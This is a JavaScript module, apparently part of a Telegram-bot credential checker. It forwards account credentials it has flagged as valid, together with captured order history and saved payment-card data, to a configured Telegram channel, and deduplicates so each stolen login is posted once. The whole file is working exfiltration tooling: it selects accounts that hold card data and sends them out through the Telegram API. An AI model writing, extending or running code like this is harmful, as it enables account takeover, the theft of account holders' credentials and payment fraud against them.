/**
 * =============================================================================
 * CHANNEL FORWARDER - Forward VALID credentials to Telegram channel
 * =============================================================================
 * 
 * Sends VALID credentials (with capture data) to a configured Telegram channel.
 * Ensures each credential is only forwarded once via channelForwardStore.
 * 
 * Forwarding conditions:
 * - Must have latest order (not 'n/a')
 * - Must have card data (profile.cards array with at least one card)
 * 
 * Requires FORWARD_CHANNEL_ID environment variable to be set.
 * 
 * =============================================================================
 */

const { hasBeenForwarded, markForwarded } = require('./channelForwardStore');
const { createLogger } = require('../logger');

const log = createLogger('channel-forwarder');

/**
 * Get the channel ID from environment.
 * @returns {string|null} Channel ID or null if not configured
 */
function getChannelId() {
  const channelId = process.env.FORWARD_CHANNEL_ID;
  if (!channelId || !channelId.trim()) {
    return null;
  }
  return channelId.trim();
}

/**
 * Check if channel forwarding is enabled.
 * @returns {boolean} True if FORWARD_CHANNEL_ID is configured
 */
function isForwardingEnabled() {
  return getChannelId() !== null;
}

/**
 * Check if capture data meets forwarding requirements.
 * Requires: latest order (not 'n/a') AND at least one card captured.
 * 
 * @param {Object} capture - Capture data from captureAccountData()
 * @returns {{ valid: boolean, reason: string }} Validation result
 */
function validateCaptureForForwarding(capture) {
  if (!capture) {
    return { valid: false, reason: 'no capture data' };
  }
  
  // Check for latest order (not 'n/a')
  if (!capture.latestOrder || capture.latestOrder === 'n/a') {
    return { valid: false, reason: 'no latest order' };
  }
  
  // Check for card data (profile must exist with cards array)
  if (!capture.profile) {
    return { valid: false, reason: 'no profile data (skip logic may have failed)' };
  }
  
  if (!capture.profile.cards || capture.profile.cards.length === 0) {
    return { valid: false, reason: 'no cards captured' };
  }
  
  return { valid: true, reason: '' };
}

/**
 * Forward a VALID credential to the configured channel.
 * Sends the exact same message that was shown to the user.
 * 
 * Only forwards if capture data meets requirements:
 * - Has latest order (not 'n/a')
 * - Has card data (at least one card)
 * 
 * @param {Object} telegram - Telegraf telegram instance (ctx.telegram)
 * @param {string} username - Email/username (for dedup check)
 * @param {string} password - Password (for dedup check)
 * @param {string} message - The full MarkdownV2 formatted message to forward
 * @param {Object} [capture] - Capture data for validation (optional for backwards compat)
 * @returns {Promise<boolean>} True if forwarded, false if skipped or failed
 */
async function forwardValidToChannel(telegram, username, password, message, capture = null) {
  const channelId = getChannelId();
  
  // Skip if channel not configured
  if (!channelId) {
    log.debug('Channel forwarding not configured (FORWARD_CHANNEL_ID not set)');
    return false;
  }
  
  // Validate capture data meets forwarding requirements
  if (capture) {
    const validation = validateCaptureForForwarding(capture);
    if (!validation.valid) {
      log.debug(`Skipping forward: ${validation.reason} (${username.slice(0, 5)}***)`);
      return false;
    }
  }
  
  try {
    // Check if already forwarded (dedupe)
    const alreadyForwarded = await hasBeenForwarded(username, password);
    if (alreadyForwarded) {
      log.debug(`Already forwarded: ${username.slice(0, 5)}***`);
      return false;
    }
    
    // Send the exact same message to channel
    await telegram.sendMessage(channelId, message, {
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true,
    });
    
    // Mark as forwarded
    await markForwarded(username, password);
    
    log.info(`Forwarded to channel: ${username.slice(0, 5)}***`);
    return true;
    
  } catch (err) {
    // Log error but don't throw - channel forwarding should not break main flow
    log.error(`Channel forward failed: ${err.message}`);
    
    // Common error handling
    if (err.message.includes('chat not found')) {
      log.error('Channel not found. Check FORWARD_CHANNEL_ID is correct and bot is added to channel.');
    } else if (err.message.includes('not enough rights')) {
      log.error('Bot does not have permission to post in channel. Make bot an admin.');
    }
    
    return false;
  }
}

module.exports = {
  forwardValidToChannel,
  isForwardingEnabled,
  getChannelId,
  validateCaptureForForwarding,
};
